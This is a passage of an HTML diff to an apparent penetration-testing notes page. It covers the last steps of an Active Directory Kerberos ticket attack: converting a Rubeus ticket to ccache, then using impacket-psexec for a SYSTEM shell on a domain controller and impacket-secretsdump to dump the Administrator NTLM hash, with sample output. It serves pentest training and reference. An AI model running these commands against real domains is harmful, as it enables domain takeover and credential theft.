+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIGujCCBr ...[SNIP]... VyLmh0Yg==
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Ticket successfully imported!
 </span></span></span></code></pre></div><h4 id="7-convert-to-ccache-format">7. Convert to ccache format</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 rubeustoccache.py &lt;BASE64_TICKET&gt; secrets.kirbi secrets.ccache
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 rubeustoccache.py &#39;&lt;BASE64_TICKET&gt;&#39; secrets.kirbi secrets.ccache
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> python3 rubeustoccache.py <span class="s1">&#39;doIGujCCBr ...[SNIP]... VyLmh0Yg==&#39;</span> secrets.kirbi secrets.ccache
+</span></span><span class="line"><span class="cl"><span class="go">╦═╗┬ ┬┌┐ ┌─┐┬ ┬┌─┐  ┌┬┐┌─┐  ╔═╗┌─┐┌─┐┌─┐┬ ┬┌─┐
+</span></span></span><span class="line"><span class="cl"><span class="go">╠╦╝│ │├┴┐├┤ │ │└─┐   │ │ │  ║  │  ├─┤│  ├─┤├┤ 
+</span></span></span><span class="line"><span class="cl"><span class="go">╩╚═└─┘└─┘└─┘└─┘└─┘   ┴ └─┘  ╚═╝└─┘┴ ┴└─┘┴ ┴└─┘
+</span></span></span><span class="line"><span class="cl"><span class="go">              By Solomon Sklash
+</span></span></span><span class="line"><span class="cl"><span class="go">          github.com/SolomonSklash
+</span></span></span><span class="line"><span class="cl"><span class="go">   Inspired by Zer1t0&#39;s ticket_converter.py
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Writing decoded .kirbi file to secrets.kirbi
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Writing converted .ccache file to secrets.ccache
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] All done! Don&#39;t forget to set your environment variable: export KRB5CCNAME=secrets.ccache
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">export KRB5CCNAME=secrets.ccache
-</span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/SolomonSklash/RubeusToCcache">RubeusToCcache</a></em></small></p>
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>secrets.ccache
+</span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/SolomonSklash/RubeusToCcache">RubeusToCcache</a></em></small></p>
 <h4 id="8-post-attack">8. Post-Attack</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Remote
 </span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-psexec &lt;DOMAIN&gt;/administrator@&lt;TARGET_DOMAIN&gt; -k -no-pass
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s dc.example.com <span class="o">&amp;&amp;</span> impacket-psexec example.com/administrator@dc.example.com -k -no-pass
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Requesting shares on dc.example.com.....
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Found writable share ADMIN$
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Uploading file sxEWFPos.exe
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Opening SVCManager on dc.example.com.....
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Creating service OtwL on dc.example.com.....
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Starting service OtwL.....
+</span></span></span><span class="line"><span class="cl"><span class="go">[!] Press help for extra shell commands
+</span></span></span><span class="line"><span class="cl"><span class="go">Microsoft Windows [Version 10.0.17763.5830]
+</span></span></span><span class="line"><span class="cl"><span class="go">(c) 2018 Microsoft Corporation. All rights reserved.
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">C:\WINDOWS\system32&gt; 
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Or secretsdump
 </span></span><span class="line"><span class="cl"><span class="go">impacket-secretsdump administrator@&lt;TARGET_DOMAIN&gt; -k -no-pass -just-dc-user Administrator
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> impacket-secretsdump administrator@dc.example.com -k -no-pass -just-dc-user Administrator
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using the DRSUAPI method to get NTDS.DIT secrets
+</span></span></span><span class="line"><span class="cl"><span class="go">Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ddf32e17a6ac5ce04a8ecbf782ca509:::
+</span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Cleaning up...
 </span></span></span></code></pre></div></div></p>
 
 </div></div>
